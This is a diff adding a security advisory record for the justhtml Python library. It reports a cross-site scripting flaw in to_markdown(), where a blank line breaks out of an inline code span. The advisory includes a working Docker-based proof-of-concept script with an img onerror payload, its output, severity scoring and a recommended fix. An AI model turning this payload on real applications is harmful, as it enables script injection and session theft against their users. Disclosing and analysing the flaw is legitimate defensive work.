@@ -1,0 +1,101 @@
+{
+  "id": "GHSA-jf6w-2mvx-633j",
+  "modified": "2026-06-25T17:45:07.152206908Z",
+  "published": "2026-06-25T17:35:52Z",
+  "summary": "justhtml: to_markdown() code-span blank-line breakout enables XSS",
+  "details": "# justhtml: to_markdown() code-span blank-line breakout enables XSS\n\n### Summary\n\nIn `justhtml` 0.9.0 through 1.21.0, `to_markdown()` renders `\u003ccode\u003e` text (and `\u003cpre\u003e` text inside a link) as an inline Markdown code span whose only protection is backtick-fence length. A blank line (`\\n\\n`) in that text terminates the inline span in any compliant Markdown renderer, so attacker-controlled text that survived HTML sanitization is emitted **unescaped** after the blank line and is re-parsed as live raw HTML/Markdown — yielding XSS in the default configuration. Likely **CWE-79 (Cross-site Scripting)** arising from **CWE-116 (Improper Encoding/Escaping of Output)**.\n\n### Details\n\n`to_markdown()` is documented as a safety surface. `docs/text.md` states the guarantee applies \"to the HTML produced by rendering that Markdown with a compliant Markdown renderer,\" and `SECURITY.md` promises `to_markdown()` \"escapes line-start Markdown markers that could change block structure\" and \"uses code fences long enough to contain backticks safely.\"\n\nThe inline code-span helper only sizes the backtick fence; it never accounts for block boundaries:\n\n`src/justhtml/node.py:32-41` (tag `v1.21.0`):\n\n```python\ndef _markdown_code_span(s: str | None) -\u003e str:\n    if s is None:\n        s = \"\"\n    # Use a backtick fence longer than any run of backticks inside.\n    fence = _markdown_backtick_fence(s, minimum=1)\n    # CommonMark requires a space if the content starts/ends with backticks.\n    needs_space = s.startswith(\"`\") or s.endswith(\"`\")\n    if needs_space:\n        return f\"{fence} {s} {fence}\"\n    return f\"{fence}{s}{fence}\"\n```\n\nThe element's text is taken verbatim (`strip=False`, so embedded newlines are preserved) and routed into that helper:\n\n`src/justhtml/node.py:1061-1078` (tag `v1.21.0`):\n\n```python\n            if tag == \"pre\":\n                code = current.to_text(separator=\"\", strip=False)\n                if current_in_link:\n                    current_builder.raw(_markdown_code_span(code))      # inline path\n                else:\n                    fence = _markdown_backtick_fence(code, minimum=3)   # block path\n                    ...\n            if tag == \"code\" and not current_preserve:\n                current_builder.raw(_markdown_code_span(current.to_text(separator=\"\", strip=False)))\n```\n\nA Markdown **inline code span is an inline construct and cannot span a block boundary**: a blank line ends the paragraph, the opening backticks are left unmatched (literal), and everything after the blank line is parsed as ordinary Markdown — independent of fence length. Because CommonMark passes raw inline HTML through by default, text such as `\u003cimg src=x onerror=...\u003e` becomes a live element.\n\nReachability with default settings: `JustHTML(html)` sanitizes by default; `\u003ccode\u003e` and `\u003cpre\u003e` are in `DEFAULT_POLICY.allowed_tags`; default sanitization preserves their text and the blank line (whitespace collapsing is opt-in). The payload lives in **text**, not a URL attribute, so URL-scheme sanitization never applies. The tokenizer decodes character references in normal text before DOM insertion, so `\u0026lt;img …\u0026gt;` enters the DOM as literal `\u003cimg …\u003e` text while passing HTML sanitization.\n\nTwo in-repo asymmetries confirm this is an unguarded path rather than intended behavior:\n\n- **Plain text-node content is HTML-escaped** before Markdown escaping, so the same `\u0026lt;img …\u0026gt;` outside a code span is neutralized to `\u0026lt;img …\u003e`. Inside a code span it is not escaped — the fence is assumed sufficient.\n- **`\u003cpre\u003e` outside a link uses a block fence** (`minimum=3`, line 1066), which a  blank line cannot break. The same `\u003cpre\u003e` **inside a link** (line 1064) and all `\u003ccode\u003e` use the inline span, which a blank line breaks.\n\n### PoC\n\nSelf-contained, runs entirely in Docker against the pinned PyPI release. Static by default: the rendered HTML is **parsed** to show a live handler-bearing element materializes; no JavaScript is executed on the default path.\n\n`Dockerfile`:\n\n```dockerfile\nFROM python:3.11-slim\nWORKDIR /poc\nRUN pip install --no-cache-dir justhtml==1.21.0 markdown-it-py==4.2.0 \\\n \u0026\u0026 (pip install --no-cache-dir dukpy==0.5.0 || echo \"dukpy optional: skipped\")\nCOPY poc.py test.sh /poc/\nCMD [\"sh\", \"/poc/test.sh\"]\n```\n\n`poc.py`:\n\n```python\n#!/usr/bin/env python3\n\"\"\"PoC: justhtml to_markdown() inline code-span blank-line breakout -\u003e XSS.\nAudited release: justhtml==1.21.0. Static by default (parses the rendered HTML;\nno JS executed). --prove-exec is an opt-in, container-only execution check.\"\"\"\nfrom __future__ import annotations\nimport argparse\nfrom html.parser import HTMLParser\nfrom justhtml import JustHTML\nfrom markdown_it import MarkdownIt\n\nMARKER = \"__POC_XSS_MARKER__\"\nPAYLOAD_TEXT = f\"\u003cimg src=x onerror={MARKER}()\u003e\"\nRENDER = MarkdownIt(\"commonmark\")  # raw-HTML passthrough is the CommonMark default\n\n\ndef build_inputs() -\u003e tuple[str, str]:\n    enc = PAYLOAD_TEXT.replace(\"\u003c\", \"\u0026lt;\").replace(\"\u003e\", \"\u0026gt;\")\n    control = f\"\u003ccode\u003eq{enc}\u003c/code\u003e\"          # no blank line -\u003e should stay inert\n    exploit = f\"\u003ccode\u003eq\\n\\n{enc}\u003c/code\u003e\"      # + one blank line -\u003e the whole exploit\n    return control, exploit\n\n\ndef to_markdown(html: str) -\u003e str:\n    return JustHTML(html, fragment=True).to_markdown()  # public API, default sanitize=True\n\n\nclass _SinkFinder(HTMLParser):\n    def __init__(self) -\u003e None:\n        super().__init__(); self.sinks: list[tuple[str, str, str]] = []\n    def handle_starttag(self, tag, attrs):\n        for name, val in attrs:\n            if name.startswith(\"on\") and val and MARKER in val:\n                self.sinks.append((tag, name, val))\n\n\ndef live_sinks(html: str):\n    f = _SinkFinder(); f.feed(html); return f.sinks\n\n\ndef show(label: str, html: str):\n    md = to_markdown(html); rendered = RENDER.render(md); sinks = live_sinks(rendered)\n    print(f\"== {label} ==\")\n    print(f\"  1. input HTML        : {html!r}\")\n    print(f\"  2. to_markdown() out : {md!r}\")\n    print(f\"  3. CommonMark render : {rendered.strip()!r}\")\n    print(f\"  4. live JS sinks     : {sinks if sinks else 'NONE (inert)'}\\n\")\n    return rendered, sinks\n\n\ndef prove_exec(rendered: str) -\u003e None:\n    print(\"== --prove-exec (supplementary, container-only) ==\")\n    sinks = live_sinks(rendered)\n    if not sinks:\n        print(\"  no sink to execute\"); return\n    handler_js = sinks[0][2]\n    print(f\"  materialized handler JS: {handler_js!r}\")\n    try:\n        import dukpy\n    except Exception:\n        print(\"  [skipped] optional 'dukpy' not installed; parse proof is canonical.\"); return\n    result = dukpy.evaljs(f\"var fired=''; function {MARKER}(){{ fired='XSS-EXECUTED'; }} {handler_js}; fired;\")\n    print(f\"  JS engine result: {result!r}  -\u003e attacker JS executed\" if result else \"  JS did not fire\")\n\n\ndef main() -\u003e int:\n    ap = argparse.ArgumentParser()\n    ap.add_argument(\"--prove-exec\", action=\"store_true\")\n    args = ap.parse_args()\n    control, exploit = build_inputs()\n    print(\"Delta between control and exploit: exactly one blank line (\\\\n\\\\n).\\n\")\n    _, c_sinks = show(\"CONTROL  (payload in \u003ccode\u003e, NO blank line)\", control)\n    ex_rendered, e_sinks = show(\"EXPLOIT  (payload in \u003ccode\u003e, + blank line)\", exploit)\n    ok = (not c_sinks) and bool(e_sinks)\n    print(\"== VERDICT ==\")\n    print(\"  BYPASS CONFIRMED.\" if ok else \"  not reproduced\")\n    if ok:\n        print(f\"  Sanitized code text became a LIVE element: {e_sinks[0]}\")\n    print()\n    if ok and args.prove_exec:\n        prove_exec(ex_rendered)\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n```\n\nBuild and run:\n\n```bash\ndocker build -t justhtml-md-poc ./poc\ndocker run --rm justhtml-md-poc\n```\n\nObserved output (`justhtml 1.21.0`, `markdown-it-py 4.2.0`):\n\n```\n=== Versions under test ===\nName: justhtml\nVersion: 1.21.0\nName: markdown-it-py\nVersion: 4.2.0\n\nDelta between control and exploit: exactly one blank line (\\n\\n)\ninserted into otherwise identical \u003ccode\u003e text.\n\n== CONTROL  (payload in \u003ccode\u003e, NO blank line) ==\n  1. input HTML        : '\u003ccode\u003eq\u0026lt;img src=x onerror=__POC_XSS_MARKER__()\u0026gt;\u003c/code\u003e'\n  2. to_markdown() out : '`q\u003cimg src=x onerror=__POC_XSS_MARKER__()\u003e`'\n  3. CommonMark render : '\u003cp\u003e\u003ccode\u003eq\u0026lt;img src=x onerror=__POC_XSS_MARKER__()\u0026gt;\u003c/code\u003e\u003c/p\u003e'\n  4. live JS sinks     : NONE (inert)\n\n== EXPLOIT  (payload in \u003ccode\u003e, + blank line) ==\n  1. input HTML        : '\u003ccode\u003eq\\n\\n\u0026lt;img src=x onerror=__POC_XSS_MARKER__()\u0026gt;\u003c/code\u003e'\n  2. to_markdown() out : '`q\\n\\n\u003cimg src=x onerror=__POC_XSS_MARKER__()\u003e`'\n  3. CommonMark render : '\u003cp\u003e`q\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=x onerror=__POC_XSS_MARKER__()\u003e`\u003c/p\u003e'\n  4. live JS sinks     : [('img', 'onerror', '__POC_XSS_MARKER__()')]\n\n== VERDICT ==\n  BYPASS CONFIRMED.\n  The blank line terminated the inline code span; sanitized code\n  text became a LIVE handler-bearing element: ('img', 'onerror', '__POC_XSS_MARKER__()')\n  The control (no blank line) stayed inert inside \u003ccode\u003e.\n```\n\nThe exploit is byte-identical to the inert control plus a single blank line\n(`\\n\\n`). Deterministic: same input → same result.\n\nOptional execution confirmation (`docker run --rm justhtml-md-poc python3 /poc/poc.py --prove-exec`)\n— supplementary; the parse proof above is canonical. Inert marker only:\n\n```\n== --prove-exec (supplementary, container-only) ==\n  materialized handler JS: '__POC_XSS_MARKER__()'\n  JS engine result: 'XSS-EXECUTED'  -\u003e attacker JS executed\n```\n\n### Impact\n\nThis is a cross-site scripting vulnerability (CWE-79). It affects any application that follows the documented pipeline: sanitize untrusted HTML with `JustHTML(...)` under default settings, call `to_markdown()`, and render the result with a CommonMark-compliant renderer (raw-HTML passthrough is the CommonMark default).\n\nAn attacker only needs to control HTML text inside a `\u003ccode\u003e` element, or a `\u003cpre\u003e` element within a link — no custom policy and no `sanitize=False`. Any user who then views the rendered page executes attacker-controlled script in their own origin, enabling cookie/session theft or actions performed as the victim.\n\nSeverity: CVSS 3.1 **6.1 (Moderate)**,\n`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`. Scope is Changed: the injected script runs in the origin of the page that renders the Markdown, a different security authority than the library that produced it.\n\n### Recommended fix\n\nDo not represent text containing a block boundary as an inline code span. In `_markdown_code_span` / the `\u003ccode\u003e` and in-link `\u003cpre\u003e` dispatch (`src/justhtml/node.py:1061-1078`), if the content contains a blank line (or any `\\n`), emit it as a fenced code **block** — reusing the existing block path at lines 1066-1074, whose fence is not broken by blank lines — or collapse newlines in inline-code content. As defense-in-depth, escape HTML/Markdown-significant characters in code-span bodies rather than relying on fence length alone, matching the existing text-node escaping already applied elsewhere.\n\n### Resources\n\n- CWE-79 — https://cwe.mitre.org/data/definitions/79.html\n- CWE-116 — https://cwe.mitre.org/data/definitions/116.html\n- Affected source (tag `v1.21.0`): `src/justhtml/node.py:32-41` (`_markdown_code_span`),  `src/justhtml/node.py:1061-1078` (`\u003cpre\u003e`/`\u003ccode\u003e` dispatch).\n- CommonMark spec — code spans are inline and cannot contain a blank line; raw HTML is passed through by default: https://spec.commonmark.org/0.31.2/#code-spans\n- Novelty: same vulnerability class as two prior, already-fixed `to_markdown()` advisories but a **distinct, still-unfixed variant**. The earlier fixes address\n  (a) HTML-escaping of plain text nodes and (b) backtick-fence **length** for `\u003cpre\u003e` code **blocks**. Neither addresses a **blank-line** break of an **inline**  code span: fence length is irrelevant to a block-boundary break, and code-span bodies are not HTML-escaped. The cited dispatch and helper are unchanged at `v1.21.0`, and `origin/main == v1.21.0` (no embargoed fix).",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "justhtml",
+        "purl": "pkg:pypi/justhtml"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0.9.0"
+            },
+            {
+              "fixed": "1.22.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.10.0",
+        "0.11.0",
+        "0.12.0",
+        "0.13.0",
+        "0.13.1",
+        "0.14.0",
+        "0.15.0",
+        "0.16.0",
+        "0.17.0",
+        "0.18.0",
+        "0.19.0",
+        "0.20.0",
+        "0.21.0",
+        "0.22.0",
+        "0.23.0",
+        "0.24.0",
+        "0.25.0",
+        "0.26.0",
+        "0.27.0",
+        "0.28.0",
+        "0.29.0",
+        "0.30.0",
+        "0.31.0",
+        "0.32.0",
+        "0.33.0",
+        "0.34.0",
+        "0.35.0",
+        "0.36.0",
+        "0.37.0",
+        "0.38.0",
+        "0.39.0",
+        "0.40.0",
+        "0.9.0",
+        "1.0.0",
+        "1.1.0",
+        "1.10.0",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.14.0",
+        "1.15.0",
+        "1.16.0",
+        "1.17.0",
+        "1.18.0",
+        "1.19.0",
+        "1.2.0",
+        "1.20.0",
+        "1.21.0",
+        "1.3.0",
+        "1.4.0",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.9.0",
+        "1.9.1"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.21.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-jf6w-2mvx-633j/GHSA-jf6w-2mvx-633j.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/EmilStenstrom/justhtml/security/advisories/GHSA-jf6w-2mvx-633j"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/EmilStenstrom/justhtml"
+    }
+  ]
+}
